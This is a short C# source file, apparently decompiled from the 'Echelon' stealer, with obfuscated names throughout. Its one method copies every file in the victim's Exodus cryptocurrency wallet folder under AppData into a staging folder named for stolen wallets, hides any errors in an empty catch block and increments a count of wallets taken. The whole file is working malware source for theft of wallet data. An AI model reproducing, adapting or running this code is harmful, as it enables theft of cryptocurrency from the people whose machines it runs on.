using Echelon;
using System.IO;

internal class aw
{
	public static string a = "\\Wallets\\Exodus\\";

	public static void a(string jr)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.AppDate + "\\Exodus\\exodus.wallet\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(jr + aw.a);
				fileInfo.CopyTo(jr + aw.a + fileInfo.Name);
			}
			ba.a++;
		}
		catch
		{
		}
	}
}
